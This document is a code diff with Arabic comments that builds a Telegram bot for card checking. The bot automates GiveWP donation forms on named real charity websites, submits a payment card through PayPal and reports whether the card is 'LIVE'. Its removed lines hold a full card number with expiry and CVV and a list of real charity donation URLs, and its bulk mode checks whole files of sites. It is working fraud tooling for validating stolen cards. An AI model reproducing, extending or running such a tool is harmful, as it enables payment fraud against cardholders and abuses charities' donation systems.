+# ═══════════════════════════════════════════════════════════════
+def check_site(url, card):
+    """يجرب Playwright أولاً، ثم requests fallback"""
+    if HAS_PW:
+        try:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            try:
+                engine = PlaywrightEngine(url, card, verbose=False)
+                r = loop.run_until_complete(engine.run())
+                if r["status"] in ("LIVE", "UNKNOWN"):
+                    return r
+                # لو Playwright فشل فشل كامل، نجرب requests
+                if r["status"] == "DEAD" and r["code"] not in (
+                    "CLOUDFLARE", "CAPTCHA", "GATEWAY_DISABLED", "FORM_NOT_PUBLISHED"
+                ):
+                    req = RequestsEngine(url, card, verbose=False)
+                    r2 = req.charge()
+                    if r2["status"] == "LIVE":
+                        return r2
+                    return r
+                return r
+            finally:
+                loop.close()
         except Exception as e:
-            elapsed = time.time() - start
-            print(f'  ❌ EXCEPTION: {str(e)[:200]}')
-            summary.append((name, 'ERROR', str(e)[:60], elapsed, False))
-        await asyncio.sleep(3)
-
-    print(f'\n{"=" * 70}\n📊 SUMMARY\n{"=" * 70}')
-    live = 0
-    for n, s, c, t, cap in summary:
-        icon = '✅' if s == 'LIVE' else '❌'
-        if s == 'LIVE':
-            live += 1
-        print(f'{icon} {n:<22} | {s:<6} | {c:<25} | {t:.1f}s{" | CAPTCHA" if cap else ""}')
-    print(f'\n💯 LIVE: {live}/{len(summary)}')
+            print(f"Playwright error: {e}")
+            # fallback
+            try:
+                req = RequestsEngine(url, card, verbose=False)
+                return req.charge()
+            except Exception as e2:
+                return {"status": "DEAD", "code": f"ALL_FAILED: {str(e2)[:80]}", "debug": {}}
+    else:
+        req = RequestsEngine(url, card, verbose=False)
+        return req.charge()
 
 
-# ═══════════════════════════════════════════════════════════════════
-# MAIN
-# ═══════════════════════════════════════════════════════════════════
-if __name__ == '__main__':
-    CARD = '4217834081794714|11|26|614'
+# ═══════════════════════════════════════════════════════════════
+# BOT HANDLERS
+# ═══════════════════════════════════════════════════════════════
+def safe_send(chat_id, text, reply_markup=None):
+    try:
+        return bot.send_message(chat_id, text, reply_markup=reply_markup)
+    except Exception as e:
+        print(f"send: {e}")
+        return None
 
-    SITES = [
-        ('stychnohumanitarian', 'https://www.stychnohumanitarianfoundation.com/donations/donation-form/'),
-        ('dandelions', 'https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1'),
-        ('svdpvenicefl', 'https://svdpvenicefl.org/donations/donations/'),
-        ('muhammadiyah', 'https://muhammadiyah.org.sg/donate/'),
-        ('embracingpurpose', 'https://embracingpurpose.org/give-now/'),
-        ('pieldemariposa', 'https://pieldemariposa.es/en/donate-now/'),
-        ('superheroprojectinc', 'https://superheroprojectinc.org/donate/'),
-        ('ymcadc', 'https://www.ymcadc.org/support-the-y/donate/'),
-        ('newmorningyfs', 'https://www.newmorningyfs.org/give-help/donate/'),
-        ('veritascc', 'https://www.veritascc.org/donate'),
-        ('violin', 'https://violin.org/giving/'),
-        ('abundantearth', 'https://abundantearthfoundation.org/donations/ancientcacao/'),
+def safe_edit(chat_id, msg_id, text):
+    try:
+        return bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text)
+    except:
+        return None
+
+
+@bot.message_handler(commands=["start"])
+def cmd_start(message):
+    kb = types.InlineKeyboardMarkup()
+    kb.add(types.InlineKeyboardButton("📖 Help", callback_data="help"))
+    text = f"""<b>🌐 GiveWP Checker Bot</b>
+
+<b>User:</b> {message.from_user.first_name}
+<b>ID:</b> <code>{message.from_user.id}</code>
+
+━━━━━━━━━━━━━━━━━━━━
+<b>Commands:</b>
+/paypal <code>&lt;url&gt;</code> — فحص موقع
+/mass — فحص ملف روابط
+/test — فحص 3 مواقع تجريبية
+/stop — إيقاف
+━━━━━━━━━━━━━━━━━━━━
+⚡ Playwright + Requests 🔥"""
+    safe_send(message.chat.id, text, reply_markup=kb)
+
+
+@bot.callback_query_handler(func=lambda c: c.data == "help")
+def cb_help(call):
+    text = """<b>📖 Help</b>
+
+<b>الاستخدام:</b>
+<code>/paypal https://site.com/donate</code>
+
+البوت:
+1. يفتح المتصفح ويلاقي الفورم
+2. يملأ البيانات + المبلغ
+3. يضغط تبرع
+4. يدخل الكارت في PayPal
+5. يقرأ الرد النهائي من الموقع
+
+<b>النتائج:</b>
+✅ LIVE — كارت شغال
+❌ DEAD — فشل/gateway معطل
+
+<b>الوقت:</b> 20-40s لكل موقع"""
+    try:
+        bot.answer_callback_query(call.id)
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id)
+    except:
+        pass
+
+
+@bot.message_handler(commands=["paypal"])
+def cmd_paypal(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) != 2:
+        safe_send(message.chat.id, "❌ Usage: <code>/paypal URL</code>")
+        return
+    url = parts[1].strip()
+    if not url.startswith(("http://", "https://")):
+        safe_send(message.chat.id, "❌ Invalid URL")
+        return
+
+    status_msg = safe_send(message.chat.id, f"🔍 Scanning...\n<code>{url[:80]}</code>")
+    if not status_msg:
+        return
+
+    def run():
+        try:
+            result = check_site(url, TEST_CARD)
+            icon = "✅" if result["status"] == "LIVE" else "❌"
+            text = f"""{icon} <b>{result["status"]}</b> | <code>{result["code"]}</code>
+
+🔗 <code>{url[:100]}</code>"""
+            if result.get("raw"):
+                text += f"\n\n📝 <b>Raw:</b>\n<code>{result['raw'][:400]}</code>"
+            safe_edit(message.chat.id, status_msg.message_id, text)
+        except Exception as e:
+            safe_edit(message.chat.id, status_msg.message_id, f"❌ Error: {str(e)[:200]}")
+
+    threading.Thread(target=run, daemon=True).start()
+
+
+@bot.message_handler(commands=["test"])
+def cmd_test(message):
+    sites = [
+        ("stychnohumanitarian", "https://www.stychnohumanitarianfoundation.com/donations/donation-form/"),
+        ("dandelions", "https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1"),
+        ("svdpvenicefl", "https://svdpvenicefl.org/donations/donations/"),
     ]
+    status_msg = safe_send(message.chat.id, f"🔍 Testing {len(sites)} sites...")
+    if not status_msg:
+        return
+
+    def run():
+        results = []
+        for name, url in sites:
+            try:
+                safe_edit(message.chat.id, status_msg.message_id,
+                          f"🔍 {name}... ({len(results)}/{len(sites)})")
+                r = check_site(url, TEST_CARD)
+                results.append((name, r["status"], r["code"]))
+            except Exception as e:
+                results.append((name, "ERROR", str(e)[:40]))
+
+        text = "<b>📊 Results:</b>\n\n"
+        for n, s, c in results:
+            icon = "✅" if s == "LIVE" else "❌"
+            text += f"{icon} <b>{n}</b>: {c}\n"
+        safe_edit(message.chat.id, status_msg.message_id, text)
+
+    threading.Thread(target=run, daemon=True).start()
+
+
+@bot.message_handler(commands=["stop"])
+def cmd_stop(message):
+    safe_send(message.chat.id, "⏹️ No active process")
+
+
+@bot.message_handler(commands=["mass"])
+def cmd_mass(message):
+    safe_send(message.chat.id, "📁 Send .txt file with URLs (one per line)")
+
+
+@bot.message_handler(content_types=["document"])
+def on_doc(message):
+    try:
+        fi = bot.get_file(message.document.file_id)
+        data = bot.download_file(fi.file_path)
+        links = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
+        if not links:
+            safe_send(message.chat.id, "❌ Empty file")
+            return
+
+        status_msg = safe_send(message.chat.id, f"📊 Scanning {len(links)} links...")
+        if not status_msg:
+            return
+
+        def run():
+            live = 0
+            for i, link in enumerate(links):
+                try:
+                    safe_edit(message.chat.id, status_msg.message_id,
+                              f"📊 {i+1}/{len(links)}\n✅ Live: {live}\n\n<code>{link[:60]}</code>")
+                    r = check_site(link, TEST_CARD)
+                    if r["status"] == "LIVE":
+                        live += 1
+                        safe_send(message.chat.id,
+                                  f"✅ LIVE: <code>{link[:80]}</code>\n{r['code']}")
+                except:
+                    pass
+            safe_edit(message.chat.id, status_msg.message_id,
+                      f"📊 Done!\n\n✅ Live: {live}\n❌ Dead: {len(links)-live}")
+
+        threading.Thread(target=run, daemon=True).start()
+    except Exception as e:
+        safe_send(message.chat.id, f"❌ Error: {str(e)[:100]}")
+
+
+# ═══════════════════════════════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════════════════════════════
+if __name__ == "__main__":
+    print("=" * 60)
+    print("🔥 GiveWP Bot — Complete Edition")
+    print("=" * 60)
+    print(f"Owner: {OWNER_ID}")
+    print(f"Token: {BOT_TOKEN[:20]}...")
+    print(f"Playwright: {'✅' if HAS_PW else '❌ (requests only)'}")
+    print(f"Browsers: {os.environ.get('PLAYWRIGHT_BROWSERS_PATH', 'default')}")
+    print("✅ Starting bot...")
 
     try:
-        asyncio.run(test_sites(CARD, SITES))
+        bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
     except KeyboardInterrupt:
-        print('\n⏹️ Interrupted')
+        print("\n⏹️ Stopped")
     except Exception as e:
-        print(f'\n❌ Fatal: {e}')
+        print(f"❌ {e}")
+        traceback.print_exc()
+        sys.exit(1)
